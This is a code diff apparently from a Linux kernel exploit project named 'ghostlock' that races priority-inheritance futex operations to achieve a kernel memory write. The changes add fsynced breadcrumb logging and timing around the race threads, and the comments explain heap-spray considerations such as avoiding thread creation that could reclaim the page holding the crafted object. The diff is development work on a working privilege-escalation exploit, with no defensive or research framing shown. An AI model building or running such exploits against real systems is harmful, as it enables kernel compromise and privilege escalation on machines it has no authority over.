@@ -11,7 +11,10 @@
 #include "route/route_controller.h"
 #include "route/route_policy.hpp"
 #include "session/exploit_session.hpp"
+#include "support/decls.hpp"
 #include "support/syscall_snapshot.hpp"
+
+#include <ctime>
 
 using namespace ghostlock;
 
@@ -325,9 +328,23 @@ ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
 }
 
 namespace ghostlock::race {
+
     /* Create, synchronize, stop and join one explicitly owned PI race. */
     Status run_main_route_threads(const memory::WriteRequest &request) {
         reset_main_route_state();
+        /* Record which write this route is about to attempt. A route that dies
+         * inside the PI walk never flushes its log file -- the page cache goes
+         * with the reboot -- so this fsynced line is the only surviving record
+         * of which stage the kernel died in. */
+        {
+            char line[80];
+            const int32_t n = snprintf(line, sizeof(line), "wd req target=%016zx mode=%d",
+                                       static_cast<size_t>(request.target),
+                                       static_cast<int32_t>(request.mode));
+            if (n > 0) {
+                support::spray_breadcrumb(line);
+            }
+        }
         pr_info("[route] creating waiter/owner/consumer\n");
         int32_t error = session::g_exploit_session.race.start_threads(
             waiter_thread, owner_thread, consumer_thread, &request);
@@ -345,7 +362,27 @@ namespace ghostlock::race {
             pr_warning("PI race thread creation failed errno=%d\n", error);
             return 0;
         }
+        /* Route wall time, for the same reason: a route that never returns
+         * writes no line at all. Deliberately no thread is created in this
+         * window -- a clone would allocate a task_struct and a kernel stack
+         * between the spray and the walk and could reclaim the very page the
+         * craft lives on. */
+        struct timespec wd_t0 {};
+        clock_gettime(CLOCK_MONOTONIC, &wd_t0);
         route::RouteStatus status = session::g_exploit_session.race.run();
+        struct timespec wd_t1 {};
+        clock_gettime(CLOCK_MONOTONIC, &wd_t1);
+        {
+            const int64_t elapsed_ms = (wd_t1.tv_sec - wd_t0.tv_sec) * 1000LL +
+                                       (wd_t1.tv_nsec - wd_t0.tv_nsec) / 1000000LL;
+            char line[96];
+            const int32_t n = snprintf(line, sizeof(line),
+                                       "wd route-returned code=%d elapsed=%lldms",
+                                       status.code, static_cast<long long>(elapsed_ms));
+            if (n > 0) {
+                support::spray_breadcrumb(line);
+            }
+        }
         if (status.code == route::ROUTE_DIRTY_FAILURE) {
             support::fail_stop_dirty_race("route_done deadline", status.error_number);
         }
